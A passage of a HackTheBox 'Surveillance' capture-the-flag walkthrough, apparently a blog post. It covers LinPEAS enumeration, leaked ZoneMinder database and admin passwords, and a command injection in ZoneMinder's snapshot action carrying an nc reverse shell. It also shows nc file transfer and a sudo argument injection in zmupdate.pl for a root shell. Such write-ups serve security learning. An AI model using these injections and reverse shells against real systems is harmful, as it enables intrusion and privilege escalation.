+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-5.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-5.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-5.png"
+        title="Alt text" width="754" height="865" /></p>
+<p>Now I can stop <code>hashcat</code> since it&rsquo;s destroying my desktop and start looking for
+privilege escalation. Unfortunately there are no easy <code>sudo</code> binaries to abuse.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">matthew@surveillance:~$ sudo -l
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> matthew:
+</span></span><span class="line"><span class="cl">Sorry, user matthew may not run sudo on surveillance.
+</span></span></code></pre></div><h2 id="linux-privilege-escalation">Linux Privilege Escalation</h2>
+<p>At this point I decide to launch a local http sever and run <code>LinPEAS</code> to help
+enumerate.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl -L http://10.10.14.5:9090/linpeas.sh <span class="p">|</span> sh <span class="p">|</span> tee linpeas.txt
+</span></span></code></pre></div><p>Some excerpts with interesting information:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">╔══════════╣ Searching passwords in config PHP files
+</span></span><span class="line"><span class="cl">/usr/share/zoneminder/www/api/app/Config/database.php:          <span class="s1">&#39;password&#39;</span> <span class="o">=</span>&gt; ZM_DB_PASS,
+</span></span><span class="line"><span class="cl">/usr/share/zoneminder/www/api/app/Config/database.php:          <span class="s1">&#39;password&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;ZoneMinderPassword2023&#39;</span>,
+</span></span><span class="line"><span class="cl">/usr/share/zoneminder/www/includes/config.php:  <span class="s1">&#39;Password&#39;</span>  <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">╔══════════╣ SGID
+</span></span><span class="line"><span class="cl">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+</span></span><span class="line"><span class="cl">-rwxr-sr-x <span class="m">1</span> root utmp 15K Mar <span class="m">24</span>  <span class="m">2022</span> /usr/lib/x86_64-linux-gnu/utempter/utempter
+</span></span><span class="line"><span class="cl">-rwxr-sr-x <span class="m">1</span> root shadow 23K Feb  <span class="m">2</span>  <span class="m">2023</span> /usr/sbin/pam_extrausers_chkpwd
+</span></span><span class="line"><span class="cl">-rwxr-sr-x <span class="m">1</span> root shadow 27K Feb  <span class="m">2</span>  <span class="m">2023</span> /usr/sbin/unix_chkpwd
+</span></span><span class="line"><span class="cl">-rwxr-sr-x <span class="m">1</span> root plocate 307K Feb <span class="m">17</span>  <span class="m">2022</span> /usr/bin/plocate <span class="o">(</span>Unknown SGID binary<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-rwxr-sr-x <span class="m">1</span> root tty 23K Feb <span class="m">21</span>  <span class="m">2022</span> /usr/bin/write.ul <span class="o">(</span>Unknown SGID binary<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-rwxr-sr-x <span class="m">1</span> root tty 23K Feb <span class="m">21</span>  <span class="m">2022</span> /usr/bin/wall
+</span></span><span class="line"><span class="cl">-rwxr-sr-x <span class="m">1</span> root shadow 71K Nov <span class="m">24</span>  <span class="m">2022</span> /usr/bin/chage
+</span></span><span class="line"><span class="cl">-rwxr-sr-x <span class="m">1</span> root shadow 23K Nov <span class="m">24</span>  <span class="m">2022</span> /usr/bin/expiry
+</span></span><span class="line"><span class="cl">-rwxr-sr-x <span class="m">1</span> root _ssh 287K Aug <span class="m">24</span> 13:40 /usr/bin/ssh-agent
+</span></span><span class="line"><span class="cl">-rwxr-sr-x <span class="m">1</span> root crontab 39K Mar <span class="m">23</span>  <span class="m">2022</span> /usr/bin/crontab
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">╔══════════╣ Analyzing SSH Files <span class="o">(</span>limit 70<span class="o">)</span>
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">603</span> Jan <span class="m">17</span>  <span class="m">2023</span> /etc/ssh/ssh_host_dsa_key.pub
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">175</span> Jan <span class="m">17</span>  <span class="m">2023</span> /etc/ssh/ssh_host_ecdsa_key.pub
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">95</span> Jan <span class="m">17</span>  <span class="m">2023</span> /etc/ssh/ssh_host_ed25519_key.pub
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">567</span> Jan <span class="m">17</span>  <span class="m">2023</span> /etc/ssh/ssh_host_rsa_key.pub
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PermitRootLogin yes
+</span></span><span class="line"><span class="cl">UsePAM yes
+</span></span><span class="line"><span class="cl">PasswordAuthentication yes
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root <span class="m">42</span> Oct <span class="m">17</span> 16:25 /etc/nginx/sites-enabled/zoneminder.conf -&gt; /etc/nginx/sites-available/zoneminder.conf
+</span></span><span class="line"><span class="cl">server <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    listen 127.0.0.1:8080<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    root /usr/share/zoneminder/www<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    index index.php<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    access_log /var/log/zm/access.log<span class="p">;</span>
+</span></span><span class="line"><span class="cl">    error_log /var/log/zm/error.log<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    location / <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        try_files <span class="nv">$uri</span> <span class="nv">$uri</span>/ /index.php?<span class="nv">$args</span> <span class="o">=</span>404<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        location ~ /api/<span class="o">(</span>css<span class="p">|</span>img<span class="p">|</span>ico<span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            rewrite ^/api<span class="o">(</span>.+<span class="o">)</span>$ /api/app/webroot/<span class="nv">$1</span> break<span class="p">;</span>
+</span></span><span class="line"><span class="cl">            try_files <span class="nv">$uri</span> <span class="nv">$uri</span>/ <span class="o">=</span>404<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        location /api <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            rewrite ^/api<span class="o">(</span>.+<span class="o">)</span>$ /api/app/webroot/index.php?p<span class="o">=</span><span class="nv">$1</span> last<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        location /cgi-bin <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            include fastcgi_params<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            fastcgi_param SCRIPT_FILENAME <span class="nv">$request_filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            fastcgi_param HTTP_PROXY <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            fastcgi_pass unix:/run/fcgiwrap.sock<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        location ~ <span class="se">\.</span>php$ <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            include fastcgi_params<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            fastcgi_param SCRIPT_FILENAME <span class="nv">$request_filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            fastcgi_param HTTP_PROXY <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            fastcgi_index index.php<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            fastcgi_pass unix:/var/run/php/php8.1-fpm-zoneminder.sock<span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>A quick Google search shows that ZoneMinder is
+&ldquo;A full-featured, open source, state-of-the-art video surveillance software system&rdquo;.</p>
+<p>This didn&rsquo;t come up in the initial port scan because it&rsquo;s only listening on
+<code>127.0.0.1</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">╔══════════╣ Active Ports
+</span></span><span class="line"><span class="cl">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN      -
+</span></span></code></pre></div><p>A simple port forward allows me to view the site.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ssh -L 9000:127.0.0.1:8080 matthew@10.10.11.245
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-6.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-6.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-6.png"
+        title="ZoneMinder Login" width="1793" height="1161" /></p>
+<h3 id="exploiting-zoneminder">Exploiting ZoneMinder</h3>
+<p>After trying a couple user/password combinations, I remember that <code>matthew</code> is
+the admin user to the site. The <code>admin:starcraft122490</code> login works and now
+have access to the admin panel.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-7.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-7.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-7.png"
+        title="ZoneMinder Admin" width="1793" height="1161" /></p>
+<p>Upon login, the version number <code>v1.36.32</code> is shown in the upper right corner.
+This version of ZoneMinder has a couple vulnerabilities.</p>
+<ul>
+<li><a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_lang_exec/" target="_blank" rel="noopener noreffer ">https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_lang_exec/</a></li>
+<li><a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_snapshots/" target="_blank" rel="noopener noreffer ">https://www.rapid7.com/db/modules/exploit/unix/webapp/zoneminder_snapshots/</a></li>
+</ul>
+<p>These modules are available via Metasploit, but I wanted to attempt this
+manually. Looking at the <a href="https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/unix/webapp/zoneminder_snapshots.rb" target="_blank" rel="noopener noreffer ">zoneminder_snapshots.rb source</a>, it looks easy enough to replicate.</p>
+<p>The Metasploit module allows unauthenticated command injection, but requires a
+CSRF token. Instead of replicating the logic to programmatically retrieve it, I
+cheat a little bit since we&rsquo;re logged in by triggering a POST request and
+grabbing the <code>__csrf_magic</code> value.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-18.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-18.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-18.png"
+        title="Copy POST Request as curl" width="1792" height="1163" /></p>
+<p>We send the modified POST request with a URI encoded reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl <span class="s1">&#39;http://127.0.0.1:9000/?&#39;</span> --compressed -X POST -H <span class="s1">&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#39;</span> -H <span class="s1">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;</span> -H <span class="s1">&#39;Accept-Language: en-US,en;q=0.5&#39;</span> -H <span class="s1">&#39;Accept-Encoding: gzip, deflate, br&#39;</span> -H <span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span class="s1">&#39;Origin: http://127.0.0.1:9000&#39;</span> -H <span class="s1">&#39;Connection: keep-alive&#39;</span> -H <span class="s1">&#39;Referer: http://127.0.0.1:9000/?view=console&#39;</span> -H <span class="s1">&#39;Cookie: zmSkin=classic; zmCSS=base; zmMontageLayout=3; zmMontageScale=; zmControlTable.bs.table.columns=%5B%22Name%22%2C%22Type%22%2C%22Protocol%22%2C%22CanMove%22%2C%22CanZoom%22%2C%22CanFocus%22%2C%22CanIris%22%2C%22CanWhiteBal%22%2C%22HasPresets%22%5D; zmControlTable.bs.table.sortOrder=asc; zmControlTable.bs.table.sortName=CanIris; ZMSESSID=8iechipb0qd842v7s7hpii66ad; zmBandwidth=high; zmControlTable.bs.table.searchText=; zmControlTable.bs.table.pageNumber=1&#39;</span> -H <span class="s1">&#39;Upgrade-Insecure-Requests: 1&#39;</span> -H <span class="s1">&#39;Sec-Fetch-Dest: document&#39;</span> -H <span class="s1">&#39;Sec-Fetch-Mode: navigate&#39;</span> -H <span class="s1">&#39;Sec-Fetch-Site: same-origin&#39;</span> -H <span class="s1">&#39;Sec-Fetch-User: ?1&#39;</span> --data-raw <span class="s1">&#39;__csrf_magic=key%3A224850641cde07fd2c00407c39571fdb77f5393f%2C1702453937&amp;view=snapshot&amp;action=create&amp;monitor_ids[0][Id]=;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.14.5%204443%20%3E%2Ftmp%2Ff&#39;</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-8.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-8.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-13-hackthebox-surveillance/assets/image-8.png"
+        title="Girsh Shell" width="752" height="308" /></p>
+<h3 id="gaining-root">Gaining Root</h3>
+<p>Starting off with seeing what <code>sudo</code> access is available to this user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> zoneminder on surveillance:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User zoneminder may run the following commands on surveillance:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/zm<span class="o">[</span>a-zA-Z<span class="o">]</span>*.pl *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">zoneminder@surveillance:/usr/share/zoneminder/www$
+</span></span></code></pre></div><p>The <code>zoneminder</code> user has access to the following tools:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">zoneminder@surveillance:/usr/bin$ ls -al /usr/bin/zm<span class="o">[</span>a-zA-Z<span class="o">]</span>*.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">43027</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmaudit.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">12939</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmcamtool.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">6043</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmcontrol.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">26232</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmdc.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">35206</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmfilter.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">5640</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmonvif-probe.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">19386</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmonvif-trigger.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">13994</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmpkg.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">17492</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmrecover.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">4815</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmstats.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">2133</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmsystemctl.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">13111</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmtelemetry.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">5340</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmtrack.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">18482</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmtrigger.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">45421</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmupdate.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">8205</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmvideo.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">7022</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmwatch.pl
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">19655</span> Nov <span class="m">23</span>  <span class="m">2022</span> /usr/bin/zmx10.pl
+</span></span></code></pre></div><p>I send these files over to my local machine to investigate instead of looking
+through them in the reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">tar -czvf /home/zoneminder/zm.tar.gz <span class="k">$(</span>ls /usr/bin/zm<span class="o">[</span>a-zA-Z<span class="o">]</span>*.pl<span class="k">)</span>
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span> &gt; zm.tar.gz <span class="c1"># on host</span>
+</span></span><span class="line"><span class="cl">nc -vn 10.10.14.5 <span class="m">4444</span> &lt; /home/zoneminder/zm.tar.gz <span class="c1"># on surveillance</span>
+</span></span></code></pre></div><p>After tediously going through each file looking for a potential exploit, I
+finally found that <code>zmupdate.pl</code> runs the <code>mysqldump</code> command with passed in
+arguments.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">zoneminder@surveillance:/usr/share/zoneminder/www$ zmupdate.pl -h
+</span></span><span class="line"><span class="cl">12/13/23 07:20:24.001590 zmupdate<span class="o">[</span>4171<span class="o">]</span>.ERR <span class="o">[</span>ZoneMinder::Logger:545<span class="o">]</span> <span class="o">[</span>Can<span class="err">&#39;</span>t open log file /var/log/zm/zmupdate.log: Permission denied<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Unknown option: h
+</span></span><span class="line"><span class="cl">Usage:
+</span></span><span class="line"><span class="cl">    zmupdate.pl -c,--check <span class="p">|</span> -f,--freshen <span class="p">|</span> -v&lt;version&gt;,--version<span class="o">=</span>&lt;version&gt;
+</span></span><span class="line"><span class="cl">    <span class="o">[</span>-u &lt;dbuser&gt; -p &lt;dbpass&gt;<span class="o">]</span>
+</span></span></code></pre></div><p><code>zmupdate.pl</code> snippet:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-perl" data-lang="perl"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$response</span> <span class="o">=~</span><span class="sr"> /^[yY]$/</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">my</span> <span class="p">(</span> <span class="nv">$host</span><span class="p">,</span> <span class="nv">$portOrSocket</span> <span class="p">)</span> <span class="o">=</span> <span class="p">(</span> <span class="nv">$Config</span><span class="p">{</span><span class="n">ZM_DB_HOST</span><span class="p">}</span> <span class="o">=~</span><span class="sr"> /^([^:]+)(?::(.+))?$/</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">my</span> <span class="nv">$command</span> <span class="o">=</span> <span class="s">&#39;mysqldump&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nv">$super</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$command</span> <span class="o">.=</span> <span class="s">&#39; --defaults-file=/etc/mysql/debian.cnf&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">elsif</span> <span class="p">(</span><span class="nv">$dbUser</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$command</span> <span class="o">.=</span> <span class="s">&#39; -u&#39;</span><span class="o">.</span><span class="nv">$dbUser</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$command</span> <span class="o">.=</span> <span class="s">&#39; -p\&#39;&#39;</span><span class="o">.</span><span class="nv">$dbPass</span><span class="o">.</span><span class="s">&#39;\&#39;&#39;</span> <span class="k">if</span> <span class="nv">$dbPass</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="nb">defined</span><span class="p">(</span><span class="nv">$portOrSocket</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="nv">$portOrSocket</span> <span class="o">=~</span><span class="sr"> /^\//</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$command</span> <span class="o">.=</span> <span class="s">&#39; -S&#39;</span><span class="o">.</span><span class="nv">$portOrSocket</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$command</span> <span class="o">.=</span> <span class="s">&#39; -h&#39;</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="s">&#39; -P&#39;</span><span class="o">.</span><span class="nv">$portOrSocket</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$command</span> <span class="o">.=</span> <span class="s">&#39; -h&#39;</span><span class="o">.</span><span class="nv">$host</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span></code></pre></div><p>I don&rsquo;t know perl so after looking up the syntax, the line <code>$command .= ' -u'.$dbUser;</code>
+appends the string <code>$dbUser</code> to <code>-u</code>. This is verified by running the command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">zoneminder@surveillance:/usr/share/zoneminder/www$ zmupdate.pl -u <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">Database already at version 1.36.32, update skipped.
+</span></span></code></pre></div><p>To prevent the code from exiting before it reaches the code block for <code>mysqldump</code>,
+I force an update to examine the output.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">zoneminder@surveillance:/usr/share/zoneminder/www$ zmupdate.pl --version<span class="o">=</span><span class="m">2</span> -u <span class="nb">test</span>
+</span></span><span class="line"><span class="cl">12/13/23 07:22:25.619568 zmupdate<span class="o">[</span>4195<span class="o">]</span>.ERR <span class="o">[</span>ZoneMinder::Logger:545<span class="o">]</span> <span class="o">[</span>Can<span class="s1">&#39;t open log file /var/log/zm/zmupdate.log: Permission denied]
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Initiating database upgrade to version 1.36.32 from version 2
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">WARNING - You have specified an upgrade from version 2 but the database version found is 1.36.32. Is this correct?
+</span></span></span><span class="line"><span class="cl"><span class="s1">Press enter to continue or ctrl-C to abort :
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">Do you wish to take a backup of your database prior to upgrading?
+</span></span></span><span class="line"><span class="cl"><span class="s1">This may result in a large file in /tmp/zm if you have a lot of events.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Press &#39;</span>y<span class="s1">&#39; for a backup or &#39;</span>n<span class="s1">&#39; to continue : y
+</span></span></span><span class="line"><span class="cl"><span class="s1">Creating backup to /tmp/zm/zm-2.dump. This may take several minutes.
+</span></span></span><span class="line"><span class="cl"><span class="s1">sh: 1: cannot create /tmp/zm/zm-2.dump: Permission denied
+</span></span></span><span class="line"><span class="cl"><span class="s1">Output:
+</span></span></span><span class="line"><span class="cl"><span class="s1">Command &#39;</span>mysqldump -utest -p<span class="s1">&#39;ZoneMinderPassword2023&#39;</span> -hlocalhost --add-drop-table --databases zm &gt; /tmp/zm/zm-2.dump<span class="err">&#39;</span> exited with status: <span class="m">2</span>
+</span></span></code></pre></div><p>It looks like breaking out of this command is possible with some bash
+finagling. I replicated the command and added in a reverse shell, then used
+<code>echo</code> so the rest of the command won&rsquo;t break.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo zmupdate.pl --version<span class="o">=</span><span class="m">2</span> -u <span class="s2">&#34;zmuser -p&#39;ZoneMinderPassword2023&#39; -hlocalhost --add-drop-table --databases zm; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.5 4443 &gt;/tmp/f; echo &#34;</span>
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png"
+        data-srcset="/posts/2023-12-13-hackthebox-surveillance/assets/image-15.png, /posts/2023-12-13-hackthebox-surveillance/assets/image-15.png 1.5x, /posts/2023-12-13-hackthebox-surveillance/assets/image-15.png 2x"
